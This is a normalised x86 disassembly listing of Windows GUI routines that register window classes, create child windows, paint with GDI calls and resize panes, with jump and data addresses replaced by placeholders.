sub esi ecx
mov eax [ esp + 0x12c ]
movzx esi ax
shr eax 0x10
mov ebp eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ esp + 0xb0 ]
mov eax [ esp + 0xb8 ]
mov edi [ esp + 0xbc ]
movzx ecx [ rw-data ]
sub eax edx
cdq
sub eax edx
mov esi eax
sar esi 0x1
add edi 0xfffffffc
lea edx [ esi - 0x8 ]
mov eax edi
sub eax ecx
mov [ esp + 0xa0 ] edx
lea edx [ eax - 0x9 ]
push 0x4001
mov [ esp + 0xa8 ] edx
push 0x3
lea edx [ esp + 0xa8 ]
push edx
lea ecx [ esi + 0x8 ]
add eax 0x7
push ebp
mov [ esp + 0xb8 ] ecx
mov [ esp + 0xbc ] eax
call [ DrawFrameControl@IAT ]
mov edx 0x3
mov [ esp + 0x54 ] edx
mov [ esp + 0x5c ] edx
mov edx 0x14
mov [ esp + 0x60 ] edx
mov [ esp + 0x68 ] edx
mov edx 0xffffffed
mov eax 0xffffffec
mov [ esp + 0x70 ] edx
mov [ esp + 0x78 ] edx
mov edx 0x2
mov ecx 0xfffffffb
mov [ esp + 0x40 ] eax
mov [ esp + 0x48 ] eax
or eax 0xffffffff
mov [ esp + 0x84 ] edx
mov [ esp + 0x8c ] edx
mov edx 0x13
mov [ esp + 0x44 ] ecx
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] 0xfffffff6
mov [ esp + 0x58 ] 0xa
mov [ esp + 0x64 ] eax
mov [ esp + 0x6c ] ecx
mov [ esp + 0x74 ] ecx
mov [ esp + 0x7c ] eax
mov [ esp + 0x80 ] 0xfffffff6
mov [ esp + 0x88 ] 0xa
mov [ esp + 0x90 ] edx
mov [ esp + 0x94 ] eax
mov [ esp + 0x98 ] edx
mov [ esp + 0x9c ] ecx
mov ecx [ esp + 0xb4 ]
mov eax [ esp + 0xbc ]
mov esi [ esp + 0xb8 ]
sub eax ecx
cdq
sub eax edx
mov edi eax
movzx eax [ rw-data ]
add esi 0xfffffffc
add eax esi
lea ecx [ eax - 0x6 ]
push 0x4002
mov [ esp + 0xa4 ] ecx
add eax 0xa
push 0x3
lea ecx [ esp + 0xa8 ]
sar edi 0x1
mov [ esp + 0xb0 ] eax
push ecx
lea edx [ edi - 0x8 ]
lea eax [ edi + 0x8 ]
push ebp
mov [ esp + 0xb4 ] edx
mov [ esp + 0xbc ] eax
call [ DrawFrameControl@IAT ]
mov edx 0x4
mov [ esp + 0x40 ] edx
mov [ esp + 0x68 ] edx
mov [ esp + 0x70 ] edx
mov eax 0xffffffec
mov edx 0xffffffed
mov [ esp + 0x44 ] eax
mov [ esp + 0x4c ] eax
mov eax 0xfffffffc
mov [ esp + 0x74 ] edx
mov [ esp + 0x7c ] edx
mov edx 0xfffffffd
xor ecx ecx
mov [ esp + 0x50 ] eax
mov [ esp + 0x58 ] eax
mov eax 0xa
mov [ esp + 0x80 ] edx
mov [ esp + 0x88 ] edx
mov edx 0x13
mov [ esp + 0x48 ] ecx
mov [ esp + 0x54 ] 0xfffffff6
mov [ esp + 0x5c ] eax
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] 0x14
mov [ esp + 0x6c ] 0x14
mov [ esp + 0x78 ] ecx
mov [ esp + 0x84 ] 0xfffffff6
mov [ esp + 0x8c ] eax
mov [ esp + 0x90 ] ecx
mov [ esp + 0x94 ] edx
mov [ esp + 0x98 ] 0x4
mov [ esp + 0x9c ] edx
jmp r-xdata
mov eax [ esp + 0x30 ]
sub eax esi
mov [ rw-data ] 0x2
mov [ rw-data ] eax
sub ebp ecx
mov [ rw-data ] 0x1
mov [ rw-data ] ebp
jmp r-xdata
push edi
call [ SetCapture@IAT ]
mov [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push 0x106
push 0x111
push eax
call esi
jmp r-xdata
mov edx [ esp + 0x24 ]
mov eax [ edx + 0xc ]
lea ecx [ esp + 0xc0 ]
push ecx
push eax
mov [ esp + 0x40 ] eax
call edi
mov eax [ esp + 0xc8 ]
mov ecx [ esp + 0x28 ]
mov ebp eax
sub ebp esi
sub ebp ecx
mov edi ebx
jns r-xdata
mov esi ebp
mov edx [ esp + 0x24 ]
mov eax [ edx + 0x10 ]
lea ecx [ esp + 0xc0 ]
push ecx
push eax
mov [ esp + 0x40 ] eax
call edi
mov eax [ esp + 0xcc ]
mov ecx [ esp + 0x2c ]
mov edi eax
sub edi ebx
sub edi ecx
mov ebp esi
jns r-xdata
mov ebx ebp
lea eax [ ebp - 0x8 ]
cmp eax ebx
jge r-xdata
cmp ecx esi
jl r-xdata
push ecx
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10c
retn 0x10
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x30 ]
sub eax edx
cdq
sub eax edx
mov edx [ esp + 0x1c ]
sar eax 0x1
lea esi [ eax - 0x14 ]
cmp esi edx
jge r-xdata
add eax 0x14
cmp esi eax
jge r-xdata
cmp edi [ rw-data ]
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
sub ebp ecx
mov eax [ esp + 0x14 ]
push eax
push ebp
call ebx
mov edi [ esp + 0x18 ]
mov edi [ esp + 0x18 ]
push edi
push ebp
call ebx
jmp r-xdata
lea eax [ esp + 0xd0 ]
push eax
mov [ esp + 0xd4 ] 0x1
call [ CreateBrushIndirect@IAT ]
push eax
push ebp
mov [ esp + 0x2c ] eax
call ebx
mov ecx [ esp + 0x24 ]
push ecx
push ebp
mov [ esp + 0x40 ] eax
call ebx
mov edx [ esp + 0x10 ]
push edx
push ebp
call ebx
mov eax [ esp + 0xac ]
mov ecx [ esp + 0xa8 ]
mov edx [ esp + 0xa4 ]
push eax
mov eax [ esp + 0xa4 ]
push ecx
push edx
push eax
push ebp
call [ Rectangle@IAT ]
mov ecx [ esp + 0x38 ]
push ecx
push ebp
call ebx
mov edx [ esp + 0x24 ]
push edx
call [ DeleteObject@IAT ]
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
mov ecx [ esp + 0x70 ]
add eax esi
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x74 ]
add edx edi
add ecx esi
add eax edi
mov [ esp + 0x44 ] edx
mov edx [ esp + 0x48 ]
mov [ esp + 0x70 ] ecx
mov ecx [ esp + 0x4c ]
mov [ esp + 0x74 ] eax
mov eax [ esp + 0x78 ]
add edx esi
add ecx edi
add eax esi
mov [ esp + 0x48 ] edx
mov edx [ esp + 0x7c ]
mov [ esp + 0x4c ] ecx
mov ecx [ esp + 0x50 ]
mov [ esp + 0x78 ] eax
mov eax [ esp + 0x54 ]
add edx edi
add ecx esi
add eax edi
mov [ esp + 0x7c ] edx
mov edx [ esp + 0x80 ]
mov [ esp + 0x50 ] ecx
mov ecx [ esp + 0x84 ]
mov [ esp + 0x54 ] eax
mov eax [ esp + 0x58 ]
add edx esi
add ecx edi
add eax esi
mov [ esp + 0x80 ] edx
mov edx [ esp + 0x5c ]
mov [ esp + 0x84 ] ecx
mov ecx [ esp + 0x88 ]
mov [ esp + 0x58 ] eax
mov eax [ esp + 0x8c ]
add edx edi
add ecx esi
mov [ esp + 0x5c ] edx
mov [ esp + 0x88 ] ecx
add eax edi
mov edx [ esp + 0x60 ]
mov ecx [ esp + 0x64 ]
mov [ esp + 0x8c ] eax
mov eax [ esp + 0x90 ]
add edx esi
add ecx edi
add eax esi
mov [ esp + 0x60 ] edx
mov edx [ esp + 0x94 ]
mov [ esp + 0x64 ] ecx
mov ecx [ esp + 0x68 ]
mov [ esp + 0x90 ] eax
mov eax [ esp + 0x6c ]
add edx edi
add ecx esi
add eax edi
mov [ esp + 0x94 ] edx
mov edx [ esp + 0x98 ]
mov [ esp + 0x68 ] ecx
mov ecx [ esp + 0x9c ]
mov [ esp + 0x6c ] eax
mov al [ rw-data ]
add edx esi
add ecx edi
test al al
mov [ esp + 0x98 ] edx
mov [ esp + 0x9c ] ecx
jne r-xdata
mov [ rw-data ] 0x1
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
lea ecx [ esi + edx ]
mov edx [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
mov eax [ edx ]
cmp eax [ rw-data ]
mov [ esp + 0x3c ] ecx
jne r-xdata
sub eax ecx
mov esi eax
mov eax [ esp + 0x10 ]
xor ebp ebp
cmp esi eax
jge r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x3c ] edx
mov edx [ esp + 0x24 ]
lea ecx [ ebx + eax ]
mov eax [ edx ]
cmp eax [ rw-data ]
mov [ esp + 0x10 ] ecx
jne r-xdata
sub eax ecx
mov ebx eax
mov eax [ esp + 0x10 ]
xor edi edi
cmp ebx eax
jge r-xdata
cmp ebx ebp
jge r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
add eax 0x14
cmp edx eax
jge r-xdata
mov ecx 0x7f00
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
mov edi [ SetWindowPos@IAT ]
je r-xdata
push edi
mov edx [ esp + 0x14 ]
push edx
jmp r-xdata
mov esi [ Polyline@IAT ]
push 0x6
lea ecx [ esp + 0x44 ]
push ecx
push ebp
call esi
mov al [ rw-data ]
test al al
jne r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov [ rw-data ] ecx
jmp r-xdata
mov esi eax
cmp eax [ rw-data ]
jne r-xdata
mov [ rw-data ] ecx
jmp r-xdata
mov ebx eax
push 0x0
push 0x0
push edi
mov [ rw-data ] 0x1
call [ InvalidateRect@IAT ]
jmp r-xdata
mov ecx 0x7f00
push 0x4
push ebp
push esi
push 0x0
push 0x0
push 0x0
push ebx
call [ SetWindowPos@IAT ]
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
push 0xf
push esi
push 0x0
push 0x0
push 0x0
push eax
call edi
push ebp
call ebx
push 0x6
lea eax [ esp + 0x74 ]
push eax
push ebp
call esi
mov ecx [ esp + 0x3c ]
push ecx
push ebp
call ebx
mov edx [ esp + 0x14 ]
mov esi [ DeleteObject@IAT ]
push edx
call esi
push edi
call esi
mov eax [ esp + 0x10 ]
push eax
call esi
mov edi [ esp + 0x120 ]
cmp eax [ rw-data ]
jne r-xdata
mov [ rw-data ] ebp
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ LockWindowUpdate@IAT ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x120 ]
push 0x4
push ebx
push esi
mov esi [ SetWindowPos@IAT ]
push ecx
push edx
push 0x0
push eax
call esi
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
push 0x4
push edi
push ebp
push ecx
push edx
push 0x0
push eax
call esi
push 0x0
call [ LockWindowUpdate@IAT ]
mov ecx [ rw-data ]
push ecx
call [ UpdateWindow@IAT ]
mov edi [ esp + 0x120 ]
jmp r-xdata
mov [ rw-data ] edi
jmp r-xdata
push 0x4
add ebp 0xfffffff1
push ebp
push esi
push 0xf
push 0x0
push 0x0
push ebx
call edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10c
retn 0x10
mov [ rw-data ] ecx
sub_451330
sub esp 0x28
push ebx
mov ebx [ GetWindowLongA@IAT ]
push ebp
push esi
push edi
mov edi [ esp + 0x3c ]
xor esi esi
push 0xfffffffa
push edi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] sub_450450
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
call ebx
mov ebp [ RegisterClassA@IAT ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x28 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] rw-data
call ebp
test ax ax
jne r-xdata
push 0xfffffffa
push edi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] sub_450610
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
call ebx
lea ecx [ esp + 0x10 ]
push ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] esi
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] 0x10
mov [ esp + 0x34 ] esi
mov [ esp + 0x38 ] rw-data
call ebp
neg ax
pop edi
pop esi
pop ebp
pop ebx
sbb eax eax
neg eax
add esp 0x28
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x28
retn
sub_4513f0
push ebx
push ebp
mov ebp [ GetWindowLongA@IAT ]
push esi
push edi
mov edi [ esp + 0x14 ]
push 0x0
push 0xfffffffa
push edi
call ebp
mov ebx [ CreateWindowExA@IAT ]
push eax
push 0x0
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x52000000
push rw-data
push rw-data
push 0x0
call ebx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x0
push 0xfffffffa
push edi
call ebp
push eax
push 0x0
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x52000000
push rw-data
push rw-data
push 0x0
call ebx
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
push 0xfffffffa
push edi
call ebp
push eax
push 0x0
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x52000000
push rw-data
push rw-data
push 0x0
call [ CreateWindowExA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0x20 ]
xor ecx ecx
mov edx eax
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
cmp [ esp + 0x28 ] 0x2
mov [ eax ] ebx
mov [ eax + 0x4 ] esi
jne r-xdata
mov [ eax + 0x10 ] edi
mov [ eax + 0xc ] edi
jmp r-xdata
mov ebp [ SetWindowLongA@IAT ]
push eax
push 0xffffffeb
push ebx
call ebp
mov eax [ esp + 0x24 ]
xor ecx ecx
mov edx eax
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
push eax
mov [ edx + 0xc ] ecx
push 0xffffffeb
mov [ edx + 0x10 ] ecx
push edi
mov [ eax ] edi
mov [ eax + 0x4 ] esi
call ebp
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x28 ]
push eax
push 0xffffffeb
push esi
mov [ eax ] esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] ecx
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
sub_451570
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_451330
push 0x2
push rw-data
push rw-data
push rw-data
push 0x1e
push esi
call sub_4513f0
add esp 0x1c
test eax eax
pop esi
je r-xdata
or eax 0xffffffff
retn
mov eax [ rw-data ]
push 0x1
push rw-data
push rw-data
push rw-data
push 0x1e
push eax
call sub_4513f0
add esp 0x18
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x2
push rw-data
push rw-data
push rw-data
push 0x1e
push ecx
call sub_4513f0
add esp 0x18
test eax eax
je r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push eax
call sub_451510
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push edx
call sub_451510
mov eax [ rw-data ]
push 0x1
push rw-data
push rw-data
push rw-data
push 0x1e
push eax
call sub_4513f0
add esp 0x28
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x2
push rw-data
push rw-data
push rw-data
push 0x1e
push ecx
call sub_4513f0
add esp 0x18
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
push edx
push eax
call sub_451510
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ecx
push edx
call sub_451510
add esp 0x10
xor eax eax
retn
sub_451690
mov eax [ rw-data ]
sub esp 0x10
test eax eax
je r-xdata
add esp 0x10
retn
push ebx
mov bl [ esp + 0x18 ]
test bl bl
push esi
push edi
mov edi [ LockWindowUpdate@IAT ]
jne r-xdata
push 0x5
push eax
call [ ShowWindow@IAT ]
push 0x0
push eax
call [ ShowWindow@IAT ]
mov eax [ rw-data ]
push eax
call edi
jmp r-xdata
cmp [ rw-data ] 0x4
pop edi
mov [ rw-data ] esi
pop esi
pop ebx
jne r-xdata
push 0x0
call edi
mov edx [ rw-data ]
lea ecx [ esp + 0xc ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
mov esi [ rw-data ]
push eax
push ecx
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
call sub_451550
add esp 0x8
test bl bl
jne r-xdata
mov edx [ rw-data ]
push 0x1
push 0x0
push 0x0
push edx
push 0x4
call sub_47e330
add esp 0x14
sub_451740
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push eax
call sub_428730
add esp 0x4
test eax eax
jne r-xdata
push eax
mov eax [ rw-data ]
push eax
call sub_451510
add esp 0x8
mov eax 0x1
retn
sub_451770
mov eax [ rw-data ]
sub esp 0x10
test eax eax
jne r-xdata
mov al [ esp + 0x14 ]
test al al
jne r-xdata
call sub_451740
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x5
push ecx
mov eax [ rw-data ]
push 0x0
push eax
jmp r-xdata
add esp 0x10
retn
mov ecx [ rw-data ]
push 0x1
push 0x0
push 0x0
push ecx
push 0x4
call sub_47e330
add esp 0x14
call [ ShowWindow@IAT ]
mov eax [ rw-data ]
push esi
lea edx [ esp + 0x4 ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
mov esi [ rw-data ]
push 0x4
push ecx
push edx
push 0x0
push 0x0
push 0x0
push eax
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
call [ SetWindowPos@IAT ]
cmp [ rw-data ] 0x4
mov [ rw-data ] esi
pop esi
jne r-xdata
sub_451820
sub esp 0x10
push ebx
mov bl [ esp + 0x18 ]
test bl bl
je r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
mov edx [ rw-data ]
push edx
call [ SetFocus@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push esi
lea ecx [ esp + 0x8 ]
push ecx
push edx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ rw-data ]
mov esi [ rw-data ]
push 0x4
push eax
push ecx
push 0x0
push 0x0
push 0x0
push edx
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
call [ SetWindowPos@IAT ]
cmp [ rw-data ] 0x4
mov [ rw-data ] esi
pop esi
jne r-xdata
mov eax [ rw-data ]
push 0x5
push eax
call [ ShowWindow@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
test bl bl
je r-xdata
mov eax [ rw-data ]
push 0x1
push 0x0
push 0x0
push eax
push 0x4
call sub_47e330
add esp 0x14
pop ebx
add esp 0x10
retn
push eax
call sub_42b460
add esp 0x4
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x501
push ecx
call [ PostMessageA@IAT ]
push eax
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
call sub_451510
add esp 0x8
sub_451930
mov eax [ rw-data ]
sub esp 0x10
test eax eax
jne r-xdata
mov al [ esp + 0x14 ]
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0x5
push edx
mov ecx [ rw-data ]
push 0x0
push ecx
jmp r-xdata
add esp 0x10
retn
push eax
call sub_41eab0
add esp 0x4
test eax eax
je r-xdata
mov edx [ rw-data ]
push 0x1
push 0x0
push 0x0
push edx
push 0x4
call sub_47e330
add esp 0x14
call [ ShowWindow@IAT ]
mov ecx [ rw-data ]
push esi
lea eax [ esp + 0x4 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
push 0x4
push edx
push eax
push 0x0
push 0x0
push 0x0
push ecx
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
call [ SetWindowPos@IAT ]
cmp [ rw-data ] 0x4
mov [ rw-data ] esi
pop esi
jne r-xdata
push eax
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
call sub_451510
add esp 0x8
sub_451a10
mov eax [ rw-data ]
sub esp 0x30
push ebx
xor ebx ebx
cmp eax ebx
jne r-xdata
mov eax [ rw-data ]
push esi
mov esi [ GetWindowLongA@IAT ]
push edi
push 0xfffffffa
push eax
call esi
mov edi [ LoadIconA@IAT ]
push 0x6e
push eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x3c ] r--data
mov [ esp + 0x18 ] 0x3
mov [ esp + 0x14 ] 0x30
call edi
mov ecx [ esp + 0x20 ]
push 0x10c
push ecx
mov [ esp + 0x2c ] eax
call edi
push 0x7f00
push ebx
mov [ esp + 0x40 ] eax
call [ LoadCursorA@IAT ]
lea edx [ esp + 0xc ]
push edx
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x18 ] sub_490380
call [ RegisterClassExA@IAT ]
test ax ax
jne r-xdata
xor eax eax
pop ebx
add esp 0x30
retn
mov eax [ rw-data ]
push ebx
push 0xfffffffa
push eax
call esi
mov ecx [ rw-data ]
push eax
push ebx
push ecx
push 0x64
push 0x64
push ebx
push ebx
push 0x50000000
push ebx
push r--data
push ebx
call [ CreateWindowExA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
pop edi
mov [ rw-data ] esi
mov eax esi
pop esi
pop ebx
add esp 0x30
retn
mov edx [ rw-data ]
push esi
push edx
call sub_451510
add esp 0x8
sub_451b10
mov eax [ esp + 0x8 ]
sub esp 0xac
cmp eax 0xf
push ebx
push ebp
mov ebp [ esp + 0xb8 ]
push esi
mov esi [ esp + 0xc8 ]
push edi
ja r-xdata
sub eax 0x200
je r-xdata
je r-xdata
mov ebx [ InvalidateRect@IAT ]
mov eax esi
mov esi [ rw-data ]
shr eax 0x10
mov [ esp + 0x14 ] eax
mov [ esp + 0x13 ] 0x0
xor edi edi
mov edx eax
lea esp [ esp ]
dec eax
je r-xdata
mov edi [ esp + 0xc0 ]
lea edx [ esp + 0x7c ]
push edx
push edi
call [ BeginPaint@IAT ]
mov esi eax
lea eax [ esp + 0x20 ]
push eax
push edi
call [ GetClientRect@IAT ]
push 0xf
call [ GetSysColorBrush@IAT ]
mov ebx [ SelectObject@IAT ]
push eax
push esi
call ebx
mov edi [ CreatePen@IAT ]
push 0x0
push 0x1
push 0x0
mov [ esp + 0x54 ] eax
call edi
push 0xffffff
push 0x1
mov ebp eax
push 0x0
mov [ esp + 0x28 ] ebp
call edi
push ebp
push esi
mov [ esp + 0x1c ] eax
call ebx
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x24 ]
push edx
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x2c ]
push eax
push ecx
push esi
call [ Rectangle@IAT ]
push esi
call [ CreateCompatibleDC@IAT ]
mov edx [ rw-data ]
mov ebp eax
push edx
push ebp
call ebx
mov edi [ BitBlt@IAT ]
mov ebx [ LineTo@IAT ]
mov [ esp + 0x18 ] 0x0
mov eax [ esp + 0x18 ]
lea ecx [ ecx ]
dec eax
je r-xdata
inc edi
cmp edi 0x5
jl r-xdata
cmp ecx [ eax + rw-data ]
jg r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push ebp
call [ GetClientRect@IAT ]
mov eax [ rw-data ]
test eax eax
mov [ rw-data ] eax
je r-xdata
dec eax
jne r-xdata
cmp eax 0x1
jne r-xdata
test ebp ebp
je r-xdata
push 0x1020
push 0x0
push 0x0
push 0x0
push 0x124
push 0xfffffffa
push ebp
call [ GetWindowLongA@IAT ]
push eax
call [ LoadImageA@IAT ]
mov ecx [ esi + 0x4 ]
push 0x0
push ecx
push 0x0
push ebp
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x1
push r--data
push r--data
push 0x0
mov [ rw-data ] eax
call [ CreateWindowExA@IAT ]
mov [ rw-data ] eax
xor eax eax
mov ecx 0xb
lea edi [ esp + 0x50 ]
[ edi ]
mov edi [ SendMessageA@IAT ]
mov [ esp + 0x50 ] 0x2c
mov [ esp + 0x54 ] 0x10
mov [ esp + 0x58 ] ebp
xor esi esi
dec eax
je r-xdata
movzx ecx [ esp + 0xcc ]
mov eax edi
shl eax 0x4
cmp [ eax + rw-data ] ecx
jg r-xdata
mov al [ esp + 0x13 ]
test al al
jne r-xdata
cmp [ eax + rw-data ] edx
jg r-xdata
mov eax [ esp + 0xcc ]
mov ecx [ esp + 0xc8 ]
mov edx [ esp + 0xc4 ]
push eax
push ecx
push edx
push ebp
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xac
retn 0x10
push 0x0
lea edx [ esp + 0x24 ]
push edx
push ebp
call [ InvalidateRect@IAT ]
jmp r-xdata
mov ebx [ InvalidateRect@IAT ]
mov eax esi
shr eax 0x10
xor edi edi
mov [ esp + 0x14 ] eax
xor esi esi
nop
cmp eax 0x2
jne r-xdata
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
inc eax
cmp ecx eax
mov [ esp + 0x40 ] eax
jne r-xdata
push 0xcc0020
push eax
push eax
mov eax [ rw-data ]
push ebp
push 0xc
push 0xe
push 0x1
inc eax
push eax
push esi
call edi
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ esi * 4 + rw-data ]
lea eax [ esp + 0x50 ]
push eax
push 0x0
push 0x404
push ecx
mov [ esp + 0x84 ] edx
mov [ esp + 0x6c ] esi
call edi
inc esi
cmp esi 0x5
jl r-xdata
jmp r-xdata
mov eax [ rw-data ]
push eax
call [ DeleteObject@IAT ]
mov [ rw-data ] 0x0
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp edx [ eax + rw-data ]
jg r-xdata
push ebp
call [ UpdateWindow@IAT ]
inc esi
cmp esi 0x5
jl r-xdata
movzx edx [ esp + 0xcc ]
cmp edx [ ecx + rw-data ]
jg r-xdata
cmp eax 0x3
jne r-xdata
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
push 0xcc0020
push 0x0
push 0xe
push ebp
push 0xc
push 0xe
push eax
inc ecx
push ecx
push esi
call edi
jmp r-xdata
cmp eax 0x5
mov [ esp + 0x18 ] eax
jl r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
lea eax [ esp + 0x20 ]
push eax
push ebp
call [ GetClientRect@IAT ]
mov eax [ esp + 0x20 ]
mov esi [ esp + 0x24 ]
mov ebx [ SendMessageA@IAT ]
lea edi [ eax + 0x18 ]
mov [ rw-data ] edi
lea edi [ eax + 0x26 ]
mov [ rw-data ] edi
lea edi [ eax + 0x28 ]
lea ecx [ eax + 0x4 ]
mov [ rw-data ] edi
lea edi [ eax + 0x36 ]
mov [ rw-data ] ecx
lea ecx [ eax + 0x12 ]
mov [ rw-data ] edi
lea edi [ eax + 0x3c ]
lea edx [ esi + 0x1 ]
add eax 0x4a
mov [ rw-data ] eax
mov eax [ esp + 0x28 ]
mov [ rw-data ] ecx
lea ecx [ esi + 0xd ]
mov [ rw-data ] edx
mov [ rw-data ] edx
mov [ rw-data ] edx
mov [ rw-data ] edx
lea edx [ eax - 0x12 ]
add eax 0xfffffffe
mov [ rw-data ] edi
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov [ rw-data ] ecx
add esi 0x2
mov [ rw-data ] eax
xor eax eax
mov ecx 0xb
lea edi [ esp + 0x50 ]
[ edi ]
mov [ rw-data ] esi
mov [ rw-data ] edx
mov [ esp + 0x50 ] 0x2c
mov [ esp + 0x54 ] 0x10
mov [ esp + 0x58 ] ebp
xor esi esi
mov edi rw-data
mov eax [ rw-data ]
test eax eax
jne r-xdata
test edi edi
jne r-xdata
movzx edx [ esp + 0xcc ]
mov ecx esi
shl ecx 0x4
cmp [ ecx + rw-data ] edx
lea eax [ ecx + rw-data ]
jg r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
cmp [ ecx + rw-data ] edx
jg r-xdata
cmp eax 0x4
jne r-xdata
test ebp ebp
je r-xdata
mov edx [ rw-data ]
push 0xcc0020
push 0xc
push 0xfffffff2
push 0x0
push 0x1b
push ebp
push 0xc
push 0xe
push 0x1
inc edx
push edx
push esi
call [ StretchBlt@IAT ]
jmp r-xdata
test eax eax
jne r-xdata
push ebp
call [ DeleteDC@IAT ]
mov eax [ esp + 0x48 ]
mov edi [ SelectObject@IAT ]
push eax
push esi
call edi
mov ecx [ esp + 0x30 ]
push ecx
push esi
call edi
mov edx [ esp + 0x1c ]
mov esi [ DeleteObject@IAT ]
push edx
call esi
mov eax [ esp + 0x14 ]
push eax
call esi
mov edx [ esp + 0xc0 ]
lea ecx [ esp + 0x7c ]
push ecx
push edx
call [ EndPaint@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xac
retn 0x10
mov edx [ esp + 0x1c ]
push edx
mov ecx [ esp + 0x14 ]
push ecx
jmp r-xdata
mov eax [ esi * 4 + rw-data ]
